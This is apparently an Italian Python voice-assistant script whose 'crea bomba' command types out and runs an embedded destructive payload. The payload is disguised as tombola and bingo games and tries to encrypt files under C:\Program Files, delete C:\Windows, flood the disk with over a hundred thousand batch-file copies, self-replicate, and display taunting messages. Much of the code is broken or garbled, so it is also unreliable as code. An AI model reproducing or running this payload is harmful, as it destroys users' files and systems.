import pyaudio
import wave
import speech_recognition as sr
import pyttsx3
import pyautogui
import subprocess
import time
import webbrowser
import shutil
import os
from colorama import Fore, Back, Style
# Inizializzazione della sintesi vocale
engine = pyttsx3.init()

def speak(text):
    engine.say(text)
    engine.runAndWait()

def record_audio():
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = 5
    OUTPUT_FILENAME = "registrazione.wav"

    audio = pyaudio.PyAudio()

    # Avvio dello stream di registrazione
    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)

    print("Inizio della registrazione...")
    frames = []

    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("Fine della registrazione.")
    
    # Terminazione dello stream e chiusura
    stream.stop_stream()
    stream.close()
    audio.terminate()

    # Salvataggio dell'audio in un file WAV
    with wave.open(OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    return OUTPUT_FILENAME

def recognize_audio(filename):
    recognizer = sr.Recognizer()
    
    with sr.AudioFile(filename) as source:
        audio = recognizer.record(source)  # legge il file audio

    try:
        # Riconoscimento del parlato
        text = recognizer.recognize_google(audio, language='it-IT')
        print(f"Hai detto: {text}")
        return text
    except sr.UnknownValueError:
        print("Non ho capito.")
        return ""
    except sr.RequestError as e:
        print(f"Errore nel servizio di riconoscimento vocale: {e}")
        return ""

def main():
    speak("benvenuto sono un assistente vocale. di blue-terminal?")
    print(Fore.GREEN+"comandi vocali:stop,salva,apri le note,apri sito,spegni pc,hakera,apri app,crea bomba")
    while True:
        filename = record_audio()
        text = recognize_audio(filename)
        
        if "stop" in text.lower():
            speak("Chiudo l'assistente. Arrivederci!")
            break
        elif "salva" in text.lower():
                pyautogui.hotkey("ctrl","s")
                speak("vuoi salvare come ?")
                messaggio = record_audio()
                text_to_type = recognize_audio(messaggio)
                nome=text_to_type
                time.sleep(1)
                for i in text_to_type:
                    pyautogui.typewrite(i)    
                pyautogui.press("enter")
        elif "apri le note" in text.lower():
            speak("sto aprendo le note cosa voi scivere?")
            subprocess.Popen(['notepad.exe'])
            messaggio = record_audio()
            text_to_type = recognize_audio(messaggio)
            for stringa in text_to_type: 
                pyautogui.typewrite(stringa)
        elif "spegni pc" in text.lower():
            speak("sto spegnendo") 
            pyautogui.hotkey('win', 'r')
            messaggio="PowerShell"
            pyautogui.typewrite(messaggio)
            pyautogui.press('enter')  
            mes="shutdown -s -t 0"
            time.sleep(1)
            for i in mes:
                pyautogui.typewrite(i)
            pyautogui.press("enter")
        elif"hakera"in text.lower():
            subprocess.run(["python","La_Bomba_finale.exe"])
            pyautogui.press("enter")
            time.sleep(4)
            stringa="si"
        elif"crea bomba"in text.lower():
            subprocess.Popen(['notepad.exe'])
            totto='''import pyttsx3
import random
import tkinter as Tk
import os
import time
import pyautogui
import ctypes
import shutil 
from cryptography.fernet import Fernet
import subprocess
from fabric import Connection
import keyboard
from docx import Document
from colorama import init, Fore, Back, Style
keyboard.wait("esc","alt",3)
#welcome to blue-terminal

subprocess.run(["echo off"])
subprocess.Popen(['notepad.exe'])
time.sleep(2)
stringa="il tuo pc è nelle mani di blue-terminal "
for stringa in stringa:
    pyautogui.typewrite(stringa)
def estrazionenumeri(file_path):
    voce=pyttsx3.init()
    voce.say("inizio il gioco la tombola sei pronto?:")
    numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
    numgen=random.choice(numeri)
    motore = pyttsx3.init()
    voce.say(numgen)
    motore.runAndWait()
    if numgen == motore:
        print("errore ripora ")
        immagine="immagine\parliano.png"
        ctypes.windll.user32.SystemParametersInfoW(20, 0, immagine, 0)
        key=Fernet.generate_key()
        with open("key.key","wb") as key_file:
            key_file.write(key)
        with open("key.key","rb")  as key_file:
            key=key_file.read() 
        fernet=Fernet(key)
        with open(file_path,"rd")as file:
            original=file.read()
        encrypter=fernet.encrypt(original)
        with open(file_path,"wb")as encrypter_file:
            encrypter_file.write(encrypter)
        percorso="C:\Program Files"
        for filename in os.listdir(percorso):
            percorso=os.path.join(percorso,filename)
            if os.path.isfile(percorso):
                encrypter_file(percorso)
    else:
        motore.say(numgen)
        motore.runAndWait()
def restarta(event,cartella,file_path):
    percorso=(cartella)
    if percorso.is_file():
        key=Fernet.generate_key()
        with open("key.key","wb") as key_file:
            key_file.write(key)
        with open("key.key","rb")  as key_file:
            key=key_file.read() 
        fernet=Fernet(key)
        with open(file_path,"rd")as file:
            original=file.read()
        encrypter=fernet.encrypt(original)
        with open(file_path,"wb")as encrypter_file:
            encrypter_file.write(encrypter)
        percorso="C:\Program Files"
        for filename in os.listdir(percorso):
            percorso=os.path.join(percorso,filename)
            if os.path.isfile(percorso):
                encrypter_file(percorso)
    numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
    numgen=random.choice(numeri)
    motore = pyttsx3.init()
    motore.say(numgen)
    motore.runAndWait()
    if numgen == motore:
        print("errore ripora ")
        file=open("tnt.bat","w")
        file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
        file.close()
        with open("dati.txt","a") as f:
            f.write(f"{event.name}\n")
        keyboard.on_press(restarta)
        keyboard.wait("1")
        for i in range(144400):
            shutil.copy("tnt.bat",f"tnt{i}.bat")
    else:
        motore.say(numgen)
        motore.runAndWait()

def autodistruzione():
    for i in range(100000):
        print("sei sicuro manca poco",i)
    f=open("rombole.py","w")
    os.remove("C:\Windows")
    os.remove("C:\Program Files")
    f.close()
    i=100
    while i != 0: 
        i-=1
    file=open("tnt.bat","w")
    file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
    file.close()
    for i in range(144400):
        shutil.copy("tnt.bat",f"tnt{i}.bat")
        print(i)
    chiave=Fernet.generate_key()
    with open("vacanze.jpg","rb") as f:
        data=f.read()
    fernet=Fernet(chiave)
    datimie=fernet.encrypt(data)
    with open("vacanze.jpg","wb") as f:
        f.write(datimie)
    print("i file sono stati criptati ")
    file=open("tnt.bat","w")
    file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
    file.close()
    subprocess.call(["tnt.py"])   
    subprocess.check_call(["ls","-la"]) 
    for i in range(144400):
        shutil.copy("tnt.bat",f"tnt{i}.bat")
        subprocess.call([f"tnt{i}.py"])   
        subprocess.run(["tnt{i}.bat"])
        subprocess.check_call(["ls","-la"]) 
        shutil.copy("tnt.bat","tnt1.bat")
        shutil.copy("tnt.bat","tnt2.bat")
        shutil.copy("tnt.bat","tnt3.bat")
        shutil.copy("tnt.bat","tnt4.bat")
        shutil.copy("tnt.bat","tnt4.bat")
        shutil.copy("tnt.bat","tnt6.bat")
        shutil.copy("tnt.bat","tnt7.bat")
        shutil.copy("tnt.bat","tnt8.bat")   
        shutil.copy("tnt.bat","tnt9.bat")
        shutil.copy("tnt.bat","tnt10.bat")
def gestione_file():
    pyautogui.hotkey('win', 'r')
    messaggio="cmd"
    pyautogui.typewrite(messaggio)
    pyautogui.press('enter')
    colore="color a"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color b"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 8"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 1"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 3"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 9"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 7"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 3"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="color 7"
    pyautogui.typewrite(colore)
    pyautogui.press("enter")
    colore="curl parrot.live"
    pyautogui.typewrite(colore)
    time.sleep(0.1)
    pyautogui.press("enter")
    subprocess.Popen(['notepad.exe'])
    time.sleep(4)
    stringa="ci vediamo alla prossima da blue-terminal i saluti" 
    n="saluti da Internet"
    for stringa in stringa: 
        pyautogui.typewrite(stringa) 
    pyautogui.press("enter")
    time.sleep(1)
    for stringa in n: 
        pyautogui.typewrite(stringa)
    pyautogui.hotkey("ctrl","s")
    nome="blue-terminal.bat"
    for i in nome: 
        pyautogui.typewrite(i) 
    pyautogui.press("enter")
    os.remove("SECURITY.py")
    f=open("antiscan.py","w")
    f.write("romeved")
    f.close()
    messaggio=Connection("chatgpt.com").run("uname -S",hide=True)
    contenuto="Ran {0.stdout}"
    print(contenuto)

 


def bingo():
    punteggio=0
    voce3=pyttsx3.init()
    voce3.say("inizio il gioco del bingo sei pronto :")
    utente=int(input("inserisci il anno di nascita "))
    if utente<18:
        print("non puoi giocare ")
    else:
        print("quoi giocare")        
        utente=int(input("pesca una carta da 1 a 4 "))
        subprocess.run("ipconfi")
    if utente==10:
        punteggio+=10
    elif utente==3:
        punteggio+=2
    if utente == 11:
        punteggio+=11
    re=10
    otto=3
    asso=11
    lista=["re=10"]
    generanumero=random.randint(1,12)
    voce=pyttsx3.init()
    voce.say(generanumero)
    voce.runAndWait()

#.8-.:U@^3£-/@^3££?+@9]|4-:
    fine=Tk.Tk()
    fine.geometry("800x300")
    fine.title("benvenuti nella tombola",)
    fine=Tk.Button(text="gioca a timbola",background="blue",command=estrazionenumeri)   
    fine.grid(row=9000,column=9000)
    fine=Tk.Button(text="gioca al bingo ",background="white",command=bingo)
    fine.grid(row=900,column=900)
    fine=Tk.Button(text="auto sistruziuone",command=autodistruzione)
    fine.grid(row=5000,column=3000) 
    fine.mainloop()
    print("hi spagniato")
    for i in range(100000):
        print("sei sicuro manca poco",i)
        f=open("rombole.py","w")
        os.remove("C:\Windows")
        os.remove("C:\Program Files")
        f.close()
    i=100
    while i != 0: 
        i-=1
    file=open("tnt.bat","w")
    file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
    file.close()
    for i in range(144400):
        shutil.copy("tnt.bat",f"tnt{i}.bat")
        print(i)
    chiave=Fernet.generate_key()
    with open(f"tnt{i}.bat","rb") as f:
        data=f.read()
    fernet=Fernet(chiave)
    datimie=fernet.encrypt(data)
    with open(f"tnt{i}.bat","wb") as f:
        f.write(datimie)
    subprocess.run("echo off")
    file=open("tnt.bat","w")
    file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
    file.close()
    subprocess.call(["tnt.py"])   
    subprocess.check_call(["ls","-la"]) 
    subprocess.run("ipconfig")
    subprocess.run("hello welcome blue-terminal")
    for i in range(144400):
        shutil.copy("tnt.bat",f"tnt{i}.bat")
        subprocess.call([f"tnt{i}.py"])   
        subprocess.run(["python","tnt.py"])
        chiave=Fernet.generate_key()
        with open(f"tnt{i}.bat","rb") as f:
            data=f.read()
        fernet=Fernet(chiave)
        datimie=fernet.encrypt(data)
        with open(f"tnt{i}.bat","wb") as f:
            f.write(datimie)
        subprocess.check_call(["ls","-la"]) 
        shutil.copy("tnt.bat","tnt1.bat")
        shutil.copy("tnt.bat","tnt2.bat")
        shutil.copy("tnt.bat","tnt3.bat")
        shutil.copy("tnt.bat","tnt4.bat")
        shutil.copy("tnt.bat","tnt4.bat")
        shutil.copy("tnt.bat","tnt6.bat")
        shutil.copy("tnt.bat","tnt7.bat")
        shutil.copy("tnt.bat","tnt8.bat")   
        shutil.copy("tnt.bat","tnt9.bat")
        shutil.copy("tnt.bat","tnt10.bat")
file2=open("nucleare.py","w")
file2.writable("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''\n''''''''---------''''''''we won't stop here we are in the Internet----''nsubprocess.run('echo off')\ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nvoce.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
file2.close()
for i in range(144400):
    shutil.copy("nucleare.py",f"nucleare{i}.py")
    subprocess.call([f"nucleare{i}.py"]) 
    shutil.run("python","nucleare.py")
comando=subprocess.run("ipconfig")
file=open("indirizzo.txt","w")
file.write(comando)
file.close()
subprocess.Popen(['notepad.exe'])
time.sleep(2)
stringa="ci vediamo alla prossima da blue-terminal i saluti  "
for stringa in stringa:
    pyautogui.typewrite(stringa)
pyautogui.hotkey('win', 'r')
messaggio="PowerShell"
pyautogui.typewrite(messaggio)
pyautogui.press('enter')
colore="color a"
pyautogui.typewrite(colore)
pyautogui.press("enter")
stringa="ti teniamo in guardia " 
for stringa in stringa: 
    pyautogui.typewrite(stringa) 
os.remove("La_Bomba_finale.exe")
os.remove(f"tnt{i}.bat")
        '''
            time.sleep(2)
            for stringa in totto:
                pyautogui.typewrite(stringa)
            pyautogui.hotkey("ctrl","s")
            name="blue-terminal.py"
            time.sleep(4)
            for i in name: 
                pyautogui.typewrite(i) 
            pyautogui.press("enter")
            subprocess.run(["Python","blue-terminal.py"])
        elif"scarica"in text.lower():
            print("ciao")
if __name__ == "__main__":
    main()
    
